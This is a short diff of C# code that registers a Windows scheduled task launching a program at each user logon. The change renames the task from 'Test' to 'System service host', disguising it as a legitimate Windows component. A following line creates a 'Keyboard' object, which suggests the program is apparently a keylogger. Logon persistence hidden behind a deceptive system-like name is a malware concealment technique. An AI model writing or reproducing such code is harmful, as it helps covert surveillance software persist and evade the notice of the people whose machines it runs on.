@@ -53,14 +53,13 @@ else
         string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
         td.Triggers.Add(new LogonTrigger { UserId = user });
         td.Actions.Add(targetPath, null, null);
-        ts.RootFolder.RegisterTaskDefinition("Test", td);
+        ts.RootFolder.RegisterTaskDefinition("System service host", td);
         Trace.WriteLine($"Created.");
     }
     catch (Exception ex)
     {
         Trace.WriteLine($"Couldn't create task scheduler entry: {ex.Message}");
     }
-
 }
 
 var k = new Keyboard();
